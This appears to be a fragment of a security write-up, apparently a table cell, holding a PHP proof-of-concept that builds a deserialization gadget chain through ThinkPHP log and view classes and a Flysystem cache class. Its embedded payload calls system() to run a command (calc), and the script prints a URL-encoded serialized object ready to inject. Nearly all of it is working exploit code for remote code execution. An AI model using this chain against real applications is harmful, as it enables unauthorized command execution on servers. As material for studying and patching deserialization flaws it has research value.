| Any method of any class, where eval is called to execute php code, thereby executing php and writing to a file.  ``` <?php  namespace League\Flysystem\Cached\Storage{      class Psr6Cache{         private $pool;         protected $autosave = false;         public function __construct($exp)         {             $this->pool = $exp;         }     } }  namespace think\log{     class Channel{         protected $logger;         protected $lazy = true;          public function __construct($exp)         {             $this->logger = $exp;              $this->lazy = false;         }     } }  namespace think{     class Request{         protected $url;         public function __construct()         {             $this->url = '<?php system(\'calc\'); exit(); ?>';         }     }     class App{         protected $instances = [];         public function __construct()         {             $this->instances = ['think\Request'=>new Request()];         }     } }  namespace think\view\driver{     class Php{} }  namespace think\log\driver{      class Socket{         protected $config = [];         protected $app;         protected $clientArg = [];          public function __construct()         {                          $this->config = [                 'debug'=>true,                 'force_client_ids' => 1,                 'allow_client_ids' => '',                 'format_head' => [new \think\view\driver\Php,'display'], # 利用类和方法             ];             $this->app = new \think\App();             $this->clientArg = ['tabid'=>'1'];         }     } }  namespace{     $c = new think\log\driver\Socket();     $b = new think\log\Channel($c);     $a = new League\Flysystem\Cached\Storage\Psr6Cache($b);     echo urlencode(serialize($a)); } ``` |
